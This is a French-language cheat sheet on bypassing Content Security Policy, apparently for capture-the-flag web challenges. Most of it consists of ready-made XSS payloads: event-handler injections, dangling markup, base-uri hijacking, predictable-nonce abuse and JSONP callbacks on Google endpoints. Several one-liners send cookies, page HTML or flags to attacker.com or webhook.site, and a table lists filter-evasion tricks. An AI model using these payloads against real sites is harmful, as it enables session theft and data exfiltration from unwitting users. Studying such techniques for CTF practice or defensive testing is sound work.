# CSP Bypass et Techniques d'Attaque

## <mark style="color:red;">CSP Bypass et Techniques d'Attaque</mark>

### <mark style="color:blue;">🎯 Méthodologie Générale</mark>

#### 1. Reconnaissance CSP

* **Analyser les headers HTTP** : `Content-Security-Policy` et `Content-Security-Policy-Report-Only`
* **Utiliser CSP Evaluator** : https://csp-evaluator.withgoogle.com/
* **Identifier les directives manquantes** : `base-uri`, `object-src`, `img-src`, etc.

#### 2. Points d'entrée à vérifier

* Paramètres GET/POST
* Headers HTTP injectables
* Cookies modifiables
* Fragment URL (`#`)

### <mark style="color:blue;">🚨 Directives CSP Dangereuses</mark>

| Directive             | Danger                   | Exploitation                         |
| --------------------- | ------------------------ | ------------------------------------ |
| `'unsafe-inline'`     | Scripts inline autorisés | `<img src=x onerror="alert(1)">`     |
| `'unsafe-eval'`       | eval() autorisé          | Injection via eval()                 |
| `'strict-dynamic'`    | Scripts dynamiques       | Contournement via scripts autorisés  |
| `*` (wildcard)        | Toutes sources           | Chargement depuis n'importe où       |
| Absence de `base-uri` | Injection `<base>`       | Redirection des ressources relatives |

### <mark style="color:blue;">🔧 Techniques de Bypass</mark>

#### 1. CSP Bypass - Inline Code

**Quand** : `script-src 'unsafe-inline'` présent

```html
<!-- Event handlers -->
<img src=x onerror="alert(1)">
<svg onload="alert(1)">

<!-- Exfiltration de données -->
<svg onload='window.location.href="//attacker.com?data=".concat(document.getElementsByTagName("p")[0].innerHTML)'>
```

**💡 Astuce** : Utiliser `//` au lieu de `http://` si filtré

#### 2. Dangling Markup

**Quand** : Pas de `img-src` ou `default-src` restrictif

```html
<!-- Méthode 1 : Meta refresh -->
<meta http-equiv="refresh" content='0;URL=https://webhook.site/xxx?exfil=

<!-- Méthode 2 : Image background -->
<body background='http://attacker.com/?

<!-- Méthode 3 : Image src (si autorisé) -->
<img src='http://attacker.com/?
```

**Important** : Ne pas fermer la balise pour capturer le contenu suivant

#### 3. CSP Nonce Bypass

**Identification** : Analyser comment le nonce est généré

```javascript
// Exemple de nonce faible basé sur input utilisateur
pseudo = "AAAAAAAAAA" -> nonce = base64(pseudo + date)
```

**Exploitation** :

```html
AAAAAAAAAA<script nonce="NONCE_PREVISIBLE">
// Contournement des filtres
location=atob("BASE64_URL")+window["doc"+"ument"]["cookie"]
</script>
```

#### 4. Base URI Injection

**Quand** : Absence de directive `base-uri`

```html
<!-- Contournement du filtre < > -->
<><base href="http://attacker.com/">

<!-- Le script relatif sera chargé depuis notre domaine -->
```

**Servir un fichier malveillant** :

```javascript
// /path/to/script.js sur attacker.com
document.location = "http://attacker.com?flag=" + document.cookie;
```

#### 5. JSONP Exploitation

**Quand** : Domaines externes autorisés (Google, APIs, etc.)

**Endpoints JSONP communs** :

```html
<!-- Google -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=PAYLOAD"></script>

<!-- Autres -->
<script src="https://maps.googleapis.com/maps/api/js?callback=PAYLOAD"></script>
```

**Exfiltration complète** :

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=window.onload=()=>{document.location=`https://attacker.com/?c=${btoa(document.body.innerHTML)}`};"></script>
```

***

### <mark style="color:blue;">🛠️ Techniques de Contournement</mark>

#### Filtres Communs et Bypass

| Filter      | Bypass                                   |
| ----------- | ---------------------------------------- |
| `http://`   | `//` ou `https://`                       |
| `<>`        | Utiliser le premier `<>` pour contourner |
| `'` (quote) | Utiliser `"`                             |
| `.` (point) | `atob()` avec base64                     |
| `document`  | `window["doc"+"ument"]`                  |
| Espaces     | `%20` ou autres encodages                |

#### Encodages Utiles

```javascript
// Base64 encoding
btoa("string") // encode
atob("encoded") // decode

// URL encoding
encodeURIComponent("string")
```

***

### <mark style="color:blue;">🎲 Payloads Types par Contexte</mark>

#### Exfiltration de Flag

```html
<!-- Via paramètre -->
<svg onload='fetch("//attacker.com?flag="+document.body.innerHTML)'>

<!-- Via redirection -->
<svg onload='location.href="//attacker.com?flag="+btoa(document.cookie)'>

<!-- Recherche dans DOM -->
<svg onload='location="//attacker.com?flag="+document.getElementsByTagName("p")[0].innerHTML.split(" ")[INDEX]'>
```

#### Exfiltration de Cookies

```html
<svg onload='fetch("//attacker.com?cookie="+document.cookie)'>
```

#### Debugging DOM

```javascript
// Trouver l'élément contenant le flag
console.log(document.getElementsByTagName("p")[0].innerHTML)
console.log(document.body.innerHTML)
```

***

### <mark style="color:blue;">🔍 Checklist d'Attaque</mark>

#### Phase 1 : Reconnaissance

* \[ ] Analyser la CSP dans les headers
* \[ ] Identifier les directives manquantes
* \[ ] Tester l'injection de base (`<i>test</i>`)
* \[ ] Vérifier les filtres en place

#### Phase 2 : Exploitation

* \[ ] Choisir la technique selon la CSP
* \[ ] Adapter les payloads aux filtres
* \[ ] Configurer un endpoint de réception
* \[ ] Tester localement avant soumission

#### Phase 3 : Exfiltration

* \[ ] Identifier la localisation du flag/données
* \[ ] Adapter la payload d'extraction
* \[ ] Encoder si nécessaire (base64, URL)
* \[ ] Soumettre au bot et attendre

### 🌐 Outils et Ressources

#### Endpoints de Test

* **Webhook.site** : Réception de données
* **Burp Collaborator** : Interaction externe
* **Beeceptor** : Mock API endpoints

#### Références

* [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
* [JSONP Endpoints](https://github.com/zigoo0/JSONBee)
* [HTTPLeaks Cheatsheet](https://github.com/cure53/HTTPLeaks)
* [HackTricks CSP](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)

### ⚡ Points Clés à Retenir

1. **Toujours analyser la CSP en premier** - Les directives manquantes sont souvent la clé
2. **Tester les filtres méthodiquement** - Chaque caractère peut être contourné
3. **Utiliser les domaines whitelistés** - JSONP sur Google/APIs autorisées
4. **Attention au timing** - `window.onload` pour l'exfiltration complète
5. **Encoder les données** - Base64 pour éviter les problèmes d'URL
6. **Ne pas fermer les balises** - Pour le dangling markup

***

_💡 **Astuce finale** : Si une technique ne fonctionne pas, essayer les autres. Souvent plusieurs approches sont possibles sur le même challenge !_
